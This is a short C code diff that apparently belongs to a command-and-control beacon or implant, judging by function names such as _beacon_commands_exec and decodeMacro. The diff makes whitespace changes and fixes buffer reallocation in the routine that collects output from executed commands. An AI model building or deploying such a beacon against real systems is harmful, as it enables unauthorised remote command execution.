@@ -544,7 +544,7 @@ int _beacon_commands_exec(char *data, int connID, int *payloadEncoderID) {
         close(pipeOut[1]);
 
         char *execOutput = parseExecOutput(pipeOut[0]);
-
+        
         close(pipeOut[0]);
 
         waitpid(procPID, NULL, 0);
@@ -696,7 +696,7 @@ char* decodeMacro(char* macroEncoded, int *payloadEncoderID) {
     }
 
     return (char*)_decodedMacro;
-    
+
 };
 
 char* parseExecOutput(int pipeInt) {
@@ -712,18 +712,19 @@ char* parseExecOutput(int pipeInt) {
     ssize_t _n;
 
     while ((_n = read(pipeInt, _tmp, sizeof(_tmp))) > 0) {
-        if ((bufferLen + _n) > bufferCap) {
+        while ((bufferLen + _n + 1) > bufferCap) {
             bufferCap *= 2;
-            char *newBuffer = realloc(buffer, bufferCap);
-            if (newBuffer == NULL) {
-                free(buffer);
-                return NULL;
-
-            }
-
-            buffer = newBuffer;
+        
+        }
+        
+        char *newBuffer = realloc(buffer, bufferCap);
+        if (newBuffer == NULL) {
+            free(buffer);
+            return NULL;
 
         }
+
+        buffer = newBuffer;
 
         memcpy(buffer + bufferLen, _tmp, _n);
         bufferLen += _n;
